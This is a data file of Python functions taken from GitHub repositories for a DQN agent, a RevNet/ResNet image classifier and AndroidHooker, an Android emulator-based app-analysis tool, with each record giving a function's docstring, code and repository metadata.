{"docstring": "\"\"\"Return only every `skip`-th frame\"\"\"\n", "func_signal": "def __init__(self, env=None, skip=4):\n", "code": "super(MaxAndSkipEnv, self).__init__(env)\n# most recent raw observations (for max pooling across time steps)\nself._obs_buffer = deque(maxlen=2)\nself._skip       = skip", "path": "utils\\atari_wrappers.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Log a list of images.\"\"\"\n\n", "func_signal": "def image_summary(self, tag, images, step):\n", "code": "img_summaries = []\nfor i, img in enumerate(images):\n    # Write the image to a string\n    try:\n        s = StringIO()\n    except:\n        s = BytesIO()\n    scipy.misc.toimage(img).save(s, format=\"png\")\n\n    # Create an Image object\n    img_sum = tf.Summary.Image(encoded_image_string=s.getvalue(),\n                               height=img.shape[0],\n                               width=img.shape[1])\n    # Create a Summary value\n    img_summaries.append(tf.Summary.Value(tag='%s/%d' % (tag, i), image=img_sum))\n\n# Create and write Summary\nsummary = tf.Summary(value=img_summaries)\nself.writer.add_summary(summary, step)", "path": "logger.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Reset only when lives are exhausted.\nThis way all states are still reachable even though lives are episodic,\nand the learner need not know about any of this behind-the-scenes.\n\"\"\"\n", "func_signal": "def _reset(self):\n", "code": "if self.was_real_done:\n    obs = self.env.reset()\n    self.was_real_reset = True\nelse:\n    # no-op step to advance from terminal/lost life state\n    obs, _, _, _ = self.env.step(0)\n    self.was_real_reset = False\nself.lives = self.env.unwrapped.ale.lives()\nreturn obs", "path": "utils\\atari_wrappers.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\" Do no-op action for a number of steps in [1, noop_max].\"\"\"\n", "func_signal": "def _reset(self):\n", "code": "self.env.reset()\nnoops = np.random.randint(1, self.noop_max + 1)\nfor _ in range(noops):\n    obs, _, _, _ = self.env.step(0)\nreturn obs", "path": "utils\\atari_wrappers.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"See Schedule.value\"\"\"\n", "func_signal": "def value(self, t):\n", "code": "fraction  = min(float(t) / self.schedule_timesteps, 1.0)\nreturn self.initial_p + fraction * (self.final_p - self.initial_p)", "path": "utils\\schedules.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Clear past frame buffer and init. to first obs. from inner env.\"\"\"\n", "func_signal": "def _reset(self):\n", "code": "self._obs_buffer.clear()\nobs = self.env.reset()\nself._obs_buffer.append(obs)\nreturn obs", "path": "utils\\atari_wrappers.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"L2 weight decay loss.\"\"\"\n", "func_signal": "def _decay(self):\n", "code": "wd_losses = tf.get_collection(tf.GraphKeys.REGULARIZATION_LOSSES)\nlog.info(\"Weight decay variables\")\n[log.info(x) for x in wd_losses]\nlog.info(\"Total length: {}\".format(len(wd_losses)))\nif len(wd_losses) > 0:\n  return tf.add_n(wd_losses)\nelse:\n  log.warning(\"No weight decay variables!\")\n  return 0.0", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Writes training accuracy.\"\"\"\n", "func_signal": "def log_train_acc(self, niter, acc):\n", "code": "log.info(\"Train accuracy = {:.3f}\".format(acc * 100))\nif self._write_to_csv:\n  with open(self.trainval_file_name, \"a\") as f:\n    f.write(\"{:d},{:s},{:e}\\n\".format(\n        niter + 1, datetime.datetime.now().isoformat(), acc))", "path": "resnet\\utils\\experiment_logger.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Initialize files.\"\"\"\n", "func_signal": "def __init__(self, logs_folder):\n", "code": "self._write_to_csv = logs_folder is not None\nself.logs_folder = logs_folder\n\nif self._write_to_csv:\n  if not os.path.isdir(logs_folder):\n    os.makedirs(logs_folder)\n\n  catalog_file = os.path.join(logs_folder, \"catalog\")\n  self.catalog_file = catalog_file\n\n  with open(catalog_file, \"w\") as f:\n    f.write(\"filename,type,name\\n\")\n\n  with open(catalog_file, \"a\") as f:\n    f.write(\"{},plain,{}\\n\".format(\"cmd.txt\", \"Commands\"))\n\n  with open(os.path.join(logs_folder, \"cmd.txt\"), \"w\") as f:\n    f.write(\" \".join(sys.argv))\n\n  with open(catalog_file, \"a\") as f:\n    f.write(\"train_ce.csv,csv,Train Loss (Cross Entropy)\\n\")\n    f.write(\"train_acc.csv,csv,Train Accuracy\\n\")\n    f.write(\"valid_acc.csv,csv,Validation Accuracy\\n\")\n    f.write(\"learn_rate.csv,csv,Learning Rate\\n\")\n\n  self.train_file_name = os.path.join(logs_folder, \"train_ce.csv\")\n  if not os.path.exists(self.train_file_name):\n    with open(self.train_file_name, \"w\") as f:\n      f.write(\"step,time,ce\\n\")\n\n  self.trainval_file_name = os.path.join(logs_folder, \"train_acc.csv\")\n  if not os.path.exists(self.trainval_file_name):\n    with open(self.trainval_file_name, \"w\") as f:\n      f.write(\"step,time,acc\\n\")\n\n  self.val_file_name = os.path.join(logs_folder, \"valid_acc.csv\")\n  if not os.path.exists(self.val_file_name):\n    with open(self.val_file_name, \"w\") as f:\n      f.write(\"step,time,acc\\n\")\n\n  self.lr_file_name = os.path.join(logs_folder, \"learn_rate.csv\")\n  if not os.path.exists(self.lr_file_name):\n    with open(self.lr_file_name, \"w\") as f:\n      f.write(\"step,time,lr\\n\")", "path": "resnet\\utils\\experiment_logger.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\" Reads and parses examples from CIFAR10 data files \"\"\"\n\n", "func_signal": "def read_CIFAR10(data_folder):\n", "code": "train_img = []\ntrain_label = []\ntest_img = []\ntest_label = []\n\ntrain_file_list = [\n    \"data_batch_1\", \"data_batch_2\", \"data_batch_3\", \"data_batch_4\",\n    \"data_batch_5\"\n]\ntest_file_list = [\"test_batch\"]\n\nfor i in xrange(len(train_file_list)):\n  tmp_dict = unpickle(\n      os.path.join(data_folder, 'cifar-10-batches-py', train_file_list[i]))\n  train_img.append(tmp_dict[\"data\"])\n  train_label.append(tmp_dict[\"labels\"])\n\ntmp_dict = unpickle(\n    os.path.join(data_folder, 'cifar-10-batches-py', test_file_list[0]))\ntest_img.append(tmp_dict[\"data\"])\ntest_label.append(tmp_dict[\"labels\"])\n\ntrain_img = np.concatenate(train_img)\ntrain_label = np.concatenate(train_label)\ntest_img = np.concatenate(test_img)\ntest_label = np.concatenate(test_label)\n\ntrain_img = np.reshape(\n    train_img, [NUM_TRAIN_IMG, NUM_CHANNEL, IMAGE_HEIGHT, IMAGE_WIDTH])\ntest_img = np.reshape(test_img,\n                      [NUM_TEST_IMG, NUM_CHANNEL, IMAGE_HEIGHT, IMAGE_WIDTH])\n\n# change format from [B, C, H, W] to [B, H, W, C] for feeding to Tensorflow\ntrain_img = np.transpose(train_img, [0, 2, 3, 1])\ntest_img = np.transpose(test_img, [0, 2, 3, 1])\n\nmean_img = np.mean(np.concatenate([train_img, test_img]), axis=0)\n\nCIFAR10_data = {}\nCIFAR10_data[\"train_img\"] = train_img - mean_img\nCIFAR10_data[\"test_img\"] = test_img - mean_img\nCIFAR10_data[\"train_label\"] = train_label\nCIFAR10_data[\"test_label\"] = test_label\n\nreturn CIFAR10_data", "path": "resnet\\data\\cifar_input.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Run training.\"\"\"\n", "func_signal": "def train_step(self, sess, inp=None, label=None):\n", "code": "if inp is not None and label is not None:\n  feed_data = {self.input: inp, self.label: label}\nelif inp is not None:\n  feed_data = {self.input: inp}\nelif label is not None:\n  feed_data = {self.label: label}\nelse:\n  feed_data = None\nresults = sess.run([self.cross_ent, self.train_op] + self.bn_update_ops,\n                   feed_dict=feed_data)\nreturn results[0]", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"FullyConnected layer for final output.\"\"\"\n", "func_signal": "def _fully_connected(self, x, out_dim):\n", "code": "x_shape = x.get_shape()\nd = x_shape[1]\nw = self._weight_variable(\n    [d, out_dim],\n    init_method=\"uniform_scaling\",\n    init_param={\"factor\": 1.0},\n    wd=self.config.wd,\n    dtype=self.dtype,\n    name=\"w\")\nb = self._weight_variable(\n    [out_dim],\n    init_method=\"constant\",\n    init_param={\"val\": 0.0},\n    name=\"b\",\n    dtype=self.dtype)\nreturn tf.nn.xw_plus_b(x, w, b)", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Convolution.\"\"\"\n", "func_signal": "def _conv(self, name, x, filter_size, in_filters, out_filters, strides):\n", "code": "with tf.variable_scope(name):\n  if self.config.filter_initialization == \"normal\":\n    n = filter_size * filter_size * out_filters\n    init_method = \"truncated_normal\"\n    init_param = {\"mean\": 0, \"stddev\": np.sqrt(2.0 / n)}\n  elif self.config.filter_initialization == \"uniform\":\n    init_method = \"uniform_scaling\"\n    init_param = {\"factor\": 1.0}\n  kernel = self._weight_variable(\n      [filter_size, filter_size, in_filters, out_filters],\n      init_method=init_method,\n      init_param=init_param,\n      wd=self.config.wd,\n      dtype=self.dtype,\n      name=\"w\")\n  return tf.nn.conv2d(x, kernel, strides, padding=\"SAME\")", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Compute the gradients to variables.\"\"\"\n", "func_signal": "def _compute_gradients(self, cost, var_list=None):\n", "code": "if var_list is None:\n  var_list = tf.trainable_variables()\ngrads = tf.gradients(cost, var_list, gate_gradients=True)\nreturn zip(grads, var_list)", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Assigns new learning rate.\"\"\"\n", "func_signal": "def assign_lr(self, session, lr_value):\n", "code": "log.info(\"Adjusting learning rate to {}\".format(lr_value))\nsession.run(self._lr_update, feed_dict={self._new_lr: lr_value})", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Downsample the feature map using average pooling, if the filter size\ndoes not match.\"\"\"\n", "func_signal": "def _possible_downsample(self, x, in_filter, out_filter, stride):\n", "code": "if stride[1] > 1:\n  with tf.variable_scope(\"downsample\"):\n    x = tf.nn.avg_pool(x, stride, stride, \"VALID\")\n\nif in_filter < out_filter:\n  with tf.variable_scope(\"pad\"):\n    x = tf.pad(\n        x, [[0, 0], [0, 0], [0, 0],\n            [(out_filter - in_filter) // 2, (out_filter - in_filter) // 2]])\nreturn x", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Writes validation accuracy.\"\"\"\n", "func_signal": "def log_valid_acc(self, niter, acc):\n", "code": "log.info(\"Valid accuracy = {:.3f}\".format(acc * 100))\nif self._write_to_csv:\n  with open(self.val_file_name, \"a\") as f:\n    f.write(\"{:d},{:s},{:e}\\n\".format(\n        niter + 1, datetime.datetime.now().isoformat(), acc))", "path": "resnet\\utils\\experiment_logger.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Run inference.\"\"\"\n", "func_signal": "def infer_step(self, sess, inp=None):\n", "code": "if inp is None:\n  feed_data = None\nelse:\n  feed_data = {self.input: inp}\nreturn sess.run(self.output, feed_dict=feed_data)", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\" Reads and parses examples from CIFAR100 python data files \"\"\"\n\n", "func_signal": "def read_CIFAR100(data_folder):\n", "code": "train_img = []\ntrain_label = []\ntest_img = []\ntest_label = []\n\ntrain_file_list = [\"cifar-100-python/train\"]\ntest_file_list = [\"cifar-100-python/test\"]\n\ntmp_dict = unpickle(os.path.join(data_folder, train_file_list[0]))\ntrain_img.append(tmp_dict[\"data\"])\ntrain_label.append(tmp_dict[\"fine_labels\"])\n\ntmp_dict = unpickle(os.path.join(data_folder, test_file_list[0]))\ntest_img.append(tmp_dict[\"data\"])\ntest_label.append(tmp_dict[\"fine_labels\"])\n\ntrain_img = np.concatenate(train_img)\ntrain_label = np.concatenate(train_label)\ntest_img = np.concatenate(test_img)\ntest_label = np.concatenate(test_label)\n\ntrain_img = np.reshape(\n    train_img, [NUM_TRAIN_IMG, NUM_CHANNEL, IMAGE_HEIGHT, IMAGE_WIDTH])\ntest_img = np.reshape(test_img,\n                      [NUM_TEST_IMG, NUM_CHANNEL, IMAGE_HEIGHT, IMAGE_WIDTH])\n\n# change format from [B, C, H, W] to [B, H, W, C] for feeding to Tensorflow\ntrain_img = np.transpose(train_img, [0, 2, 3, 1])\ntest_img = np.transpose(test_img, [0, 2, 3, 1])\nmean_img = np.mean(np.concatenate([train_img, test_img]), axis=0)\n\nCIFAR100_data = {}\nCIFAR100_data[\"train_img\"] = train_img - mean_img\nCIFAR100_data[\"test_img\"] = test_img - mean_img\nCIFAR100_data[\"train_label\"] = train_label\nCIFAR100_data[\"test_label\"] = test_label\n\nreturn CIFAR100_data", "path": "resnet\\data\\cifar_input.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Adds to counter. Adjusts learning rate if necessary.\n\nArgs:\n  niter: Current number of iterations.\n\"\"\"\n", "func_signal": "def step(self, niter):\n", "code": "if niter > self.offset_steps:\n  steps2 = niter - self.offset_steps\n  if steps2 % self.interval == 0:\n    new_lr = base_lr * np.exp(-steps2 / self.time_constant)\n    self.model.assign_lr(self.sess, new_lr)", "path": "resnet\\utils\\lr_schedule.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Downsample projection layer, if the filter size does not match.\"\"\"\n", "func_signal": "def _possible_bottleneck_downsample(self, x, in_filter, out_filter, stride):\n", "code": "if stride[1] > 1 or in_filter != out_filter:\n  x = self._conv(\"project\", x, 1, in_filter, out_filter, stride)\nreturn x", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Writes training CE.\"\"\"\n", "func_signal": "def log_train_ce(self, niter, ce):\n", "code": "log.info(\"Train Step = {:06d} || CE loss = {:.4e}\".format(niter + 1, ce))\nif self._write_to_csv:\n  with open(self.train_file_name, \"a\") as f:\n    f.write(\"{:d},{:s},{:e}\\n\".format(\n        niter + 1, datetime.datetime.now().isoformat(), ce))", "path": "resnet\\utils\\experiment_logger.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Build initial conv layers.\"\"\"\n", "func_signal": "def _init_conv(self, x, n_filters):\n", "code": "config = self.config\ninit_filter = config.init_filter\nwith tf.variable_scope(\"init\"):\n  h = self._conv(\"init_conv\", x, init_filter, self.config.num_channel,\n                 n_filters, self._stride_arr(config.init_stride))\n  h = self._batch_norm(\"init_bn\", h)\n  h = self._relu(\"init_relu\", h)\n  # Max-pooling is used in ImageNet experiments to further reduce\n  # dimensionality.\n  if config.init_max_pool:\n    h = tf.nn.max_pool(h, [1, 3, 3, 1], [1, 2, 2, 1], \"SAME\")\nreturn h", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Writes validation accuracy.\"\"\"\n", "func_signal": "def log_learn_rate(self, niter, lr):\n", "code": "if self._write_to_csv:\n  with open(self.lr_file_name, \"a\") as f:\n    f.write(\"{:d},{:s},{:e}\\n\".format(\n        niter + 1, datetime.datetime.now().isoformat(), lr))", "path": "resnet\\utils\\experiment_logger.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"Batch normalization.\"\"\"\n", "func_signal": "def _batch_norm(self, name, x, add_ops=True):\n", "code": "with tf.variable_scope(name):\n  n_out = x.get_shape()[-1]\n  try:\n    n_out = int(n_out)\n    shape = [n_out]\n  except:\n    shape = None\n  beta = self._weight_variable(\n      shape,\n      init_method=\"constant\",\n      init_param={\"val\": 0.0},\n      name=\"beta\",\n      dtype=self.dtype)\n  gamma = self._weight_variable(\n      shape,\n      init_method=\"constant\",\n      init_param={\"val\": 1.0},\n      name=\"gamma\",\n      dtype=self.dtype)\n  normed, ops = batch_norm(\n      x,\n      self.is_training,\n      gamma=gamma,\n      beta=beta,\n      axes=[0, 1, 2],\n      eps=1e-3,\n      name=\"bn_out\")\n  if add_ops:\n    if ops is not None:\n      self._bn_update_ops.extend(ops)\n  return normed", "path": "resnet\\models\\resnet_model.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\"\nArgs:\n  sess: TensorFlow session object.\n  model: Model object.\n  base_lr: Base learning rate.\n  lr_decay_steps: A list of step number which we perform learning decay.\n  lr_list: A list of learning rate decay multiplier. By default, all 0.1.\n\"\"\"\n", "func_signal": "def __init__(self, sess, model, base_lr, lr_decay_steps, lr_list=None):\n", "code": "self.model = model\nself.sess = sess\nself.lr = base_lr\nself.lr_list = lr_list\nself.lr_decay_steps = lr_decay_steps\nself.model.assign_lr(self.sess, self.lr)", "path": "resnet\\utils\\lr_schedule.py", "repo_name": "renmengye/revnet-public", "stars": 332, "license": "mit", "language": "python", "size": 526}
{"docstring": "\"\"\" Updates APK when parameters relative to APKID and filenpath are not yet set \"\"\"\n", "func_signal": "def updateAPK(self, APKID, filepath):\n", "code": "self.APKID = APKID\nself.filepath = filepath\nself.filename = self.__computeFilename(filepath)\nself.filesize = self.__computeFilesize(filepath)\nself.sha1 = self.__computeSha1(filepath)", "path": "hooker_common\\hooker_common\\APK.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Starts the device\"\"\"\n", "func_signal": "def start(self):\n", "code": "self._logger.info(\"Device starting...\")\nif not self.__checkADBRecognizeDevice():\n    raise Exception(\"ADB didn't find device {0}\".format(self.name))", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "# Replace wanted parameters\n", "func_signal": "def __replace(self, filepath):\n", "code": "self._logger.debug(\"Replacing parameters in file: {}\".format(filepath))\n\nif not os.path.exists(filepath):\n    raise Exception(\"File: {} does not exist\".format(filepath))\n\nfor line in fileinput.input(filepath, inplace=1):\n    if \"hw.ramSize\" in line:\n        line = \"hw.ramSize = {}\\n\".format(self.__ramSize)\n    elif \"vm.heapSize\"in line:\n        line = \"vm.heapSize = {}\\n\".format(self.__heapSize)\n    sys.stdout.write(line)", "path": "tools\\emulatorCreator\\HookerInstaller.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Checks if AVD exist\"\"\"\n", "func_signal": "def __checkAvdExist(self):\n", "code": "res = OSCommand.executeCommand(\"{} -list-avds\".format(self.__emulatorPath))\nif self.__avdName in res:\n    self._logger.info(\"Device {} found\".format(self.__avdName))\n    return True\n\nself._logger.error(\"Device {} not found.\".format(self.__avdName))\nreturn False", "path": "tools\\emulatorCreator\\HookerInstaller.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"The device serial number\n\"\"\"\n", "func_signal": "def serialNumber(self):\n", "code": "if self.__serialNumber is None:\n    raise Exception(\"SerialNumber is None\")\nreturn self.__serialNumber", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"\nInstalls APK within the AVD.\n\"\"\"\n\n", "func_signal": "def __installApk(self):\n", "code": "binsuPath = os.path.join(\"SuperSU-chainfire\", self.__arch, \"su\")\nsubstratePath = \"com.saurik.substrate_0.9.4010.apk\"\nsuApkPath = os.path.join(\"SuperSU-chainfire\", \"common\", \"Superuser.apk\")\n        \nif not os.path.exists(binsuPath):\n    raise Exception(\"BinSU path is not valid: {}\".format(binsuPath))\nif not os.path.exists(suApkPath):\n    raise Exception(\"SuperUser APK path is not valid: {}\".format(suApkPath))\nif not os.path.exists(substratePath):\n    raise Exception(\"Substrate path is not valid: {}\".format(substratePath))\n\n# Parse result of mount command to extract /system partition options\ncmd = [\n    self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"mount\"\n]\nres = OSCommand.executeCommand(cmd)\nself._logger.debug(res)\npartition = None\nfor line in res.split('\\n'):\n    if \"/system\" in line:\n        partition = line.split(' ')\n        break\nif partition is None:\n    raise Exception(\"No /system partition has been found\")\n\npartition_block = partition[0]\npartition_type = partition[2]\nself._logger.debug(\"Found /system partition of type: {} and block: {}\".format(partition_type, partition_block))\n\n# Mount /system as RW\ncmd = [\n    self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"mount\", \"-o\", \"rw,remount\", \"-t\",\n    partition_type, partition_block, \"/system\"\n]\nres = OSCommand.executeCommand(cmd)\nself._logger.debug(res)\ntime.sleep(1) \n\n# Get Android version\ncmd = [\n    self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"getprop\", \"ro.build.version.release\"\n]\nversion = OSCommand.executeCommand(cmd)\nself._logger.warning(\"Android version: {}\".format(version))\n\n# Push SU binary\ncmd = [\n    self.__adbPath, \"-s\", \"emulator-5554\", \"push\", binsuPath, \"/system/xbin/su\"\n]\nres = OSCommand.executeCommand(cmd)\nself._logger.debug(res)\n\n# Set SU execution rights\ncmd = [\n    self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"chmod\", \"06755\", \"/system/xbin/su\"\n]\nres = OSCommand.executeCommand(cmd)\nself._logger.debug(res)\n\ncmd = [\n    self.__adbPath, \"-s\", \"emulator-5554\", \"install\", suApkPath\n]\nres = OSCommand.executeCommand(cmd)\nself._logger.debug(res)\n\nif (\"4.1\" in version) or (\"4.2\" in version):\n    self._logger.debug(\"Nothing special to do for these versions of Android\")\n\nelif (\"4.3\" in version) or (\"4.4\" in version) or (\"5.0\" in version):\n    if True:\n        raise Exception(\"Android version {} is not supported.\".format(version))\n    else:\n        # This is a try to prepare emulator for higher versions, but is not working for now\n        # Launch su as a deamon\n        cmd = [\n            self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"/system/xbin/su\", \"-d\", \"&\"\n        ]\n        res = OSCommand.executeCommand(cmd)\n        \n        if \"4.4\" in version:\n            # Upload SELinux policy and library\n            libsupolPath = os.path.join(\"SuperSU-chainfire\", self.__arch, \"libsupol.so\")\n            supolicyPath = os.path.join(\"SuperSU-chainfire\", self.__arch, \"supolicy\")\n            if not os.path.exists(libsupolPath):\n                raise Exception(\"Libsupol.so path is not valid: {}\".format(libsupolPath))\n            if not os.path.exists(supolicyPath):\n                raise Exception(\"Supolicy path is not valid: {}\".format(supolicyPath))\n            cmd = [\n                self.__adbPath, \"-s\", \"emulator-5554\", \"push\", supolicyPath, \"/system/xbin/supolicy\"\n            ]\n            res = OSCommand.executeCommand(cmd)\n            self._logger.debug(res)\n            \n            cmd = [\n                self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"chmod\", \"06755\", \"/system/xbin/supolicy\"\n            ]\n            res = OSCommand.executeCommand(cmd)\n            self._logger.debug(res)\n            \n            cmd = [\n                self.__adbPath, \"-s\", \"emulator-5554\", \"push\", libsupolPath, \"/system/lib/libsupol.so\"\n            ]\n            res = OSCommand.executeCommand(cmd)\n            self._logger.debug(res)\n        \nelse:\n    raise Exception(\"Android version {} is not supported.\".format(version))\n\n# Install substrate application\ncmd = [\n    self.__adbPath, \"-s\", \"emulator-5554\", \"install\", substratePath\n]\nres = OSCommand.executeCommand(cmd)\nself._logger.debug(res)\n\nself._logger.info(\"Installation of APK has finished.\")", "path": "tools\\emulatorCreator\\HookerInstaller.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Starts the specified activity on the device\"\"\"\n", "func_signal": "def startActivity(self, activity):\n", "code": "if self.state != AndroidDevice.STATE_STARTED:\n    raise Exception(\"Cannot start an activity since the device is not started.\")\n\nif activity is None or len(activity)==0:\n    raise Exception(\"Cannot start an activity that has no name.\")\n\nself._logger.info(\"Starting activity {0} on device {1}\".format(activity, self.name))\n\nactivityPackage = '.'.join(activity.split('.')[:-1])\nactivityName = ''.join(activity.split('.')[-1:])\n        \n# $ adb shell am start -n activityPackage/activity\ncmd = [\n    self.mainConfiguration.adbPath,\n    \"-s\",\n    self.serialNumber,\n    \"shell\",\n    \"am\",\n    \"start\",\n    \"-n\",\n    \"{0}/.{1}\".format(activityPackage, activityName)\n]\nres = OSCommand.executeCommand(cmd)\nself._logger.debug(\"{}\".format(res))", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Analyzes the device state and returns when it's ready.\"\"\"\n", "func_signal": "def _waitForDeviceToBeReady(self):\n", "code": "if self.state != AndroidDevice.STATE_STARTING:\n    raise Exception(\"Cannot wait of a device if its not started, its current state is '{0}'\".format(self.state))\n\nself._logger.debug(\"Waiting for device {0} to be ready.\".format(self.serialNumber))\n\ncmd = [\n    self.mainConfiguration.adbPath,\n    \"-s\",\n    self.serialNumber,\n    \"wait-for-device\"\n]\nOSCommand.executeCommand(cmd)\n\nself._logger.debug(\"Waiting for the device to be ready\")\nself._logger.debug(\" - (dev.bootcomplete)\")\nready = False\nwhile not ready:\n    cmd = [\n        self.mainConfiguration.adbPath,\n        \"-s\",\n        self.serialNumber,\n        \"shell\",\n        \"getprop\",\n        \"dev.bootcomplete\"\n        ]\n    result = OSCommand.executeCommand(cmd)\n    if result is not None and result.strip() == \"1\":\n        ready = True\n    else:\n        time.sleep(1)            \n\nself._logger.debug(\"- (sys_bootcomplete)\")\nready = False\nwhile not ready:\n    cmd = [\n        self.mainConfiguration.adbPath,\n        \"-s\",\n        self.serialNumber,\n        \"shell\",\n        \"getprop\",\n        \"sys.boot_completed\"\n        ]\n    result = OSCommand.executeCommand(cmd)\n    if result is not None and result.strip() == \"1\":\n        ready = True\n    else:\n        time.sleep(1)\n    \n    self._logger.debug(\" - (init.svc.bootanim)\")\n    ready = False\n    while not ready:\n        cmd = [\n            self.mainConfiguration.adbPath,\n            \"-s\",\n            self.serialNumber,\n            \"shell\",\n            \"getprop\",\n            \"init.svc.bootanim\"\n        ]\n        result = OSCommand.executeCommand(cmd)\n        if result is not None and result.strip() == \"stopped\":\n            ready = True\n        else:\n            time.sleep(1)\n\ntime.sleep(5)\nself._logger.debug(\"Device {0} seems to be ready\".format(self.serialNumber))\nself.state = AndroidDevice.STATE_STARTED", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Pull results of analysis\"\"\"\n", "func_signal": "def _pullResults(self):\n", "code": "self._logger.info(\"Pulling results of analysis\")\ncmd = [\n    self.mainConfiguration.adbPath,\n    \"-s\",\n    self.serialNumber,\n    \"pull\",\n    \"/sdcard/hooker/events.logs\",\n    \"{0}{1}-events.logs\".format(self.mainConfiguration.androidTemporaryPath,\n                    datetime.datetime.now().strftime(\"%Y-%m-%d-%H:%M\"))\n]\np = OSCommand.executeAsyncCommand(cmd)\nstdout, stderr = p.communicate()\nself._logger.debug(\"{0}\".format(stdout))\n\nself._logger.info(\"Event logs has been pulled in {0}\".format(self.mainConfiguration.androidTemporaryPath))", "path": "hooker_xp\\hooker_xp\\device\\AndroidDevice.py", "repo_name": "AndroidHooker/hooker", "stars": 408, "license": "gpl-3.0", "language": "python", "size": 48089}
{"docstring": "\"\"\"Analyzes the device state and returns when it's ready.\"\"\"\n\n", "func_signal": "def _waitForDeviceToBeReady(self):\n", "code": "self._logger.debug(\"Waiting for device to be ready.\")\n\ncmd = [\n    self.__adbPath, \"-s\", \"emulator-5554\", \"wait-for-device\"\n]\nOSCommand.executeCommand(cmd)\n\nself._logger.debug(\"Waiting for the device to be ready\")\nself._logger.debug(\" - (dev.bootcomplete)\")\nready = False\nwhile not ready:\n    cmd = [\n        self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"getprop\", \"dev.bootcomplete\"\n    ]\n    result = OSCommand.executeCommand(cmd)\n    if result is not None and result.strip() == \"1\":\n        ready = True\n    else:\n        time.sleep(2)\n\nself._logger.debug(\"- (sys_bootcomplete)\")\nready = False\nwhile not ready:\n    cmd = [\n        self.__adbPath, \"-s\", \"emulator-5554\", \"shell\", \"getprop\", \"sys.boot_completed\"\n        ]\n    result = OSCommand.executeCommand(cmd)\n    if result is not None and result.strip() == \"1\":\n        ready = True\n    else:\n        time.sleep(1)\n    \n    